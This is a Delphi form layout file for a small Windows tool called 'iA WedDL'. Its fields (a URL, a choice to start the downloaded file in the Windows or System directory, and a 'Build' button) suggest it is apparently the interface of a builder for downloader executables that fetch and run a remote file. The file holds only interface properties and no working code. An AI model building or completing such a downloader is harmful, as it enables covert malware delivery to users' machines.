object Form1: TForm1
  Left = 190
  Top = 104
  BorderIcons = [biSystemMenu, biMinimize]
  BorderStyle = bsSingle
  Caption = 'iA WedDL'
  ClientHeight = 176
  ClientWidth = 176
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Verdana'
  Font.Style = []
  OldCreateOrder = False
  PixelsPerInch = 96
  TextHeight = 13
  object Label1: TLabel
    Left = 104
    Top = 152
    Width = 65
    Height = 17
    Alignment = taRightJustify
    AutoSize = False
    Caption = 'SiCmaggOt'
    Enabled = False
  end
  object Label2: TLabel
    Left = 8
    Top = 152
    Width = 89
    Height = 17
    AutoSize = False
    Caption = 'Idle..'
  end
  object Label3: TLabel
    Left = 8
    Top = 8
    Width = 89
    Height = 17
    AutoSize = False
    Caption = 'URL :'
  end
  object Label4: TLabel
    Left = 8
    Top = 48
    Width = 161
    Height = 17
    AutoSize = False
    Caption = 'Start downloaded file in :'
  end
  object Label5: TLabel
    Left = 72
    Top = 8
    Width = 97
    Height = 17
    Alignment = taRightJustify
    AutoSize = False
    Caption = '(60 chars max)'
  end
  object Panel1: TPanel
    Left = 0
    Top = 146
    Width = 177
    Height = 2
    TabOrder = 0
  end
  object Edit1: TEdit
    Left = 8
    Top = 24
    Width = 161
    Height = 21
    MaxLength = 60
    TabOrder = 1
    Text = 'http://www.whatever.com'
  end
  object RadioButton1: TRadioButton
    Left = 8
    Top = 72
    Width = 161
    Height = 17
    Caption = 'Windows Directory'
    Checked = True
    TabOrder = 2
    TabStop = True
  end
  object RadioButton2: TRadioButton
    Left = 8
    Top = 96
    Width = 161
    Height = 17
    Caption = 'System Directory'
    TabOrder = 3
  end
  object Button1: TButton
    Left = 96
    Top = 120
    Width = 65
    Height = 25
    Caption = 'Build'
    TabOrder = 4
    OnClick = Button1Click
  end
  object Button2: TButton
    Left = 16
    Top = 120
    Width = 65
    Height = 25
    Caption = 'About'
    TabOrder = 5
    OnClick = Button2Click
  end
end
